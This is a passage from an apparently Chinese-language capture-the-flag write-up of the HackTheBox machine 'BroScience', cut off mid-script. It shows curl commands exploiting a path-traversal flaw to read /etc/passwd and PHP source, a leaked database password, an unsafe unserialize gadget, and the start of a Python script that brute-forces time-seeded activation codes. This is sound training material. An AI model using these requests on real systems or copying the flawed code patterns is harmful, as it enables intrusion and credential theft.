class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;activate.php (CODE:200|SIZE:1256)  </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;comment.php (CODE:302|SIZE:13) </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;index.php (CODE:200|SIZE:9304) </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;login.php (CODE:200|SIZE:1936) </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;logout.php (CODE:302|SIZE:0)   </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;register.php (CODE:200|SIZE:2161)  </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;user.php (CODE:200|SIZE:1309)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-27"><a class="markdownIt-Anchor" href="#漏洞利用-27"></a> 漏洞利用</h2><p>访问主页，存在链接<code>https://broscience.htb/includes/img.php?path=bench.png</code></p><p>构造LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd&#x27;</span> --insecure </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:103:109:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:105:111:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:106:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rtkit:x:107:115:RealtimeKit,,,:&#x2F;proc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:108:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">avahi:x:110:116:Avahi mDNS daemon,,,:&#x2F;run&#x2F;avahi-daemon:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:&#x2F;run&#x2F;speech-dispatcher:&#x2F;bin&#x2F;false</span><br><span class="line">pulse:x:112:118:PulseAudio daemon,,,:&#x2F;run&#x2F;pulse:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">saned:x:113:121::&#x2F;var&#x2F;lib&#x2F;saned:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">colord:x:114:122:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">geoclue:x:115:123::&#x2F;var&#x2F;lib&#x2F;geoclue:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">Debian-gdm:x:116:124:Gnome Display Manager:&#x2F;var&#x2F;lib&#x2F;gdm3:&#x2F;bin&#x2F;false</span><br><span class="line">bill:x:1000:1000:bill,,,:&#x2F;home&#x2F;bill:&#x2F;bin&#x2F;bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">postgres:x:117:125:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>查看<code>broscience.htb/includes/img.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/img.php&#x27;</span> --insecure </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;b&gt;Error:&lt;/b&gt; Missing \&#x27;path\&#x27; parameter.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for LFI attacks</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$badwords</span> = <span class="keyword">array</span>(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;etc/passwd&quot;</span>, <span class="string">&quot;.ssh&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$badwords</span> <span class="keyword">as</span> <span class="variable">$badword</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$path</span>, <span class="variable">$badword</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;b&gt;Error:&lt;/b&gt; Attack detected.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Normalize path</span></span><br><span class="line"><span class="variable">$path</span> = urldecode(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the image</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: image/png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/images/&#x27;</span> . <span class="variable">$path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看<code>broscience.htb/includes/</code>路径下文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/&#x27;</span> --insecure </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db_connect.php</span><br><span class="line">header.php</span><br><span class="line">img.php</span><br><span class="line">navbar.php</span><br><span class="line">utils.php</span><br></pre></td></tr></table></figure><p>查看<code>broscience.htb/includes/db_connect.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/db_connect.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$db_port</span> = <span class="string">&quot;5432&quot;</span>;</span><br><span class="line"><span class="variable">$db_name</span> = <span class="string">&quot;broscience&quot;</span>;</span><br><span class="line"><span class="variable">$db_user</span> = <span class="string">&quot;dbuser&quot;</span>;</span><br><span class="line"><span class="variable">$db_pass</span> = <span class="string">&quot;RangeOfMotion%777&quot;</span>;</span><br><span class="line"><span class="variable">$db_salt</span> = <span class="string">&quot;NaCl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_conn</span> = pg_connect(<span class="string">&quot;host=<span class="subst">&#123;$db_host&#125;</span> port=<span class="subst">&#123;$db_port&#125;</span> dbname=<span class="subst">&#123;$db_name&#125;</span> user=<span class="subst">&#123;$db_user&#125;</span> password=<span class="subst">&#123;$db_pass&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$db_conn</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到postgresql数据库登陆凭证</p><p>查看<code>broscience.htb/register.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fregister.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$activation_code</span> = generate_activation_code();</span><br><span class="line"><span class="variable">$activation_link</span> = <span class="string">&quot;https://broscience.htb/activate.php?code=<span class="subst">&#123;$activation_code&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = pg_execute(<span class="variable">$db_conn</span>, <span class="string">&quot;create_user_query&quot;</span>, <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], md5(<span class="variable">$db_salt</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]), <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$activation_code</span>));</span><br></pre></td></tr></table></figure><p>得到账户激活码生成函数名，激活码参数，以及用户创建语句</p><p>查看<code>broscience.htb/includes/utils.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/utils.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">    srand(time());</span><br><span class="line">    <span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$activation_code</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rel_time</span>(<span class="params"><span class="variable">$from</span>, <span class="variable">$to</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$to</span> = ((<span class="variable">$to</span> === <span class="literal">null</span>) ? (time()) : (<span class="variable">$to</span>));</span><br><span class="line">    <span class="variable">$to</span> = ((is_int(<span class="variable">$to</span>)) ? (<span class="variable">$to</span>) : (strtotime(<span class="variable">$to</span>)));</span><br><span class="line">    <span class="variable">$from</span> = ((is_int(<span class="variable">$from</span>)) ? (<span class="variable">$from</span>) : (strtotime(<span class="variable">$from</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$units</span> = <span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;year&quot;</span>   =&gt; <span class="number">29030400</span>, <span class="comment">// seconds in a year   (12 months)</span></span><br><span class="line">        <span class="string">&quot;month&quot;</span>  =&gt; <span class="number">2419200</span>,  <span class="comment">// seconds in a month  (4 weeks)</span></span><br><span class="line">        <span class="string">&quot;week&quot;</span>   =&gt; <span class="number">604800</span>,   <span class="comment">// seconds in a week   (7 days)</span></span><br><span class="line">        <span class="string">&quot;day&quot;</span>    =&gt; <span class="number">86400</span>,    <span class="comment">// seconds in a day    (24 hours)</span></span><br><span class="line">        <span class="string">&quot;hour&quot;</span>   =&gt; <span class="number">3600</span>,     <span class="comment">// seconds in an hour  (60 minutes)</span></span><br><span class="line">        <span class="string">&quot;minute&quot;</span> =&gt; <span class="number">60</span>,       <span class="comment">// seconds in a minute (60 seconds)</span></span><br><span class="line">        <span class="string">&quot;second&quot;</span> =&gt; <span class="number">1</span>         <span class="comment">// 1 second</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$diff</span> = abs(<span class="variable">$from</span> - <span class="variable">$to</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$diff</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just now&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$suffix</span> = ((<span class="variable">$from</span> &gt; <span class="variable">$to</span>) ? (<span class="string">&quot;from now&quot;</span>) : (<span class="string">&quot;ago&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$unitCount</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$units</span> <span class="keyword">as</span> <span class="variable">$unit</span> =&gt; <span class="variable">$mult</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$diff</span> &gt;= <span class="variable">$mult</span> &amp;&amp; <span class="variable">$unitCount</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$unitCount</span> += <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// $and = (($mult != 1) ? (&quot;&quot;) : (&quot;and &quot;));</span></span><br><span class="line">            <span class="variable">$and</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="string">&quot;, &quot;</span>.<span class="variable">$and</span>.intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>).<span class="string">&quot; &quot;</span>.<span class="variable">$unit</span>.((intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>) == <span class="number">1</span>) ? (<span class="string">&quot;&quot;</span>) : (<span class="string">&quot;s&quot;</span>));</span><br><span class="line">            <span class="variable">$diff</span> -= intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>) * <span class="variable">$mult</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> .= <span class="string">&quot; &quot;</span>.<span class="variable">$suffix</span>;</span><br><span class="line">    <span class="variable">$output</span> = substr(<span class="variable">$output</span>, strlen(<span class="string">&quot;, &quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPrefs</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$theme</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$theme</span> = <span class="string">&quot;light&quot;</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;theme = <span class="variable">$theme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user-prefs&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$up_cookie</span> = base64_encode(serialize(<span class="keyword">new</span> UserPrefs()));</span><br><span class="line">            setcookie(<span class="string">&#x27;user-prefs&#x27;</span>, <span class="variable">$up_cookie</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$up_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user-prefs&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$up</span> = unserialize(base64_decode(<span class="variable">$up_cookie</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$up</span>-&gt;theme;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;light&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme_class</span>(<span class="params"><span class="variable">$theme</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$theme</span>)) &#123;</span><br><span class="line">        <span class="variable">$theme</span> = get_theme();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$theme</span>, <span class="string">&quot;light&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uk-light&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uk-dark&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_theme</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;user-prefs&#x27;</span>,base64_encode(serialize(<span class="keyword">new</span> UserPrefs(<span class="variable">$val</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$imgPath</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;imgPath = <span class="variable">$imgPath</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$tmp</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br><span class="line">        fclose(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line">        <span class="variable">$a</span>-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用户激活码生成来自于种子为<code>time()</code>的随机序列</p><p>编写以下Python脚本以自动注册并枚举时间以激活</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">register_url = <span class="string">&quot;https://broscience.htb/register.php&quot;</span></span><br><span class="line">register_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;bfl2&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;bfl2@bfl.bfl&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;bfl&quot;</span>, <span class="string">&quot;password-confirm&quot;</span>: <span class="string">&quot;bfl&quot;</span>&#125;</span><br><span class="line">activate_url = <span class="string">&quot;https://broscience.htb/activate.php?code=%s&quot;</span></span><br><span class="line"></span><br><span class="line">res = req.get(url = register_url, verify = <span class="literal">False</span>)</span><br><span class="line">start_time_str = res.headers[<span class="string">&quot;Date&quot;</span>]</span><br><span class="line">start_time = subprocess.Popen(<span class="string">&quot;php -r &#x27;echo strtotime(\&quot;%s\&quot;);&#x27;&quot;</span> % start_time_str, 